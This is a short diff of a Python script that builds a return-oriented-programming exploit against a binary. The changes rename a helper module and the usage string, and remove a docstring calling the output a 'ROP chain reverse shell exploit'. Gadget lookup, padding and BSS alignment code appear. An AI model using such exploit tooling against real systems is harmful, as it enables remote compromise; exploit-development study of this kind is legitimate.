@@ -5,7 +5,7 @@ from itertools import permutations, product
 
 import address_pop
 import exploit_gadgets
-import junk_length_and_addresses
+import input_length
 from get_gadgets import get_gadgets, push_to_reg
 
 
@@ -35,17 +35,12 @@ def schedule(commands):
     return -1
 
 def rop_exploit(binary_name):
-    """Create the full ROP chain reverse shell exploit
-
-    :param cli_args: The command line arguments
-    :param base_address: The base .data address
-    :return: The full ROP chain reverse shell exploit packed bytes sequence
-    """
+    
     rop = exploit_gadgets.ROPgadgets(binary_name)
     gadgets = get_gadgets(rop)
     
     INT80     = pack('<I', rop.get_gadget("int 0x80 ; ret")) # int 0x80
-    (padding, data, bss) = junk_length_and_addresses.get_everything(binary_name)
+    (padding, data, bss) = input_length.get_everything(binary_name)
     
     # We need to align the BSS with the page size
     bss = (bss & 0xfffff000)
@@ -83,7 +78,7 @@ def rop_exploit(binary_name):
 
 def main():
     if len(sys.argv) < 3:
-        print("Usage mprotect.py <binary name> <payload name>")
+        print("Usage ropoverflow.py <binary name> <payload name>")
         exit(1)
 
     binary_name = sys.argv[1]
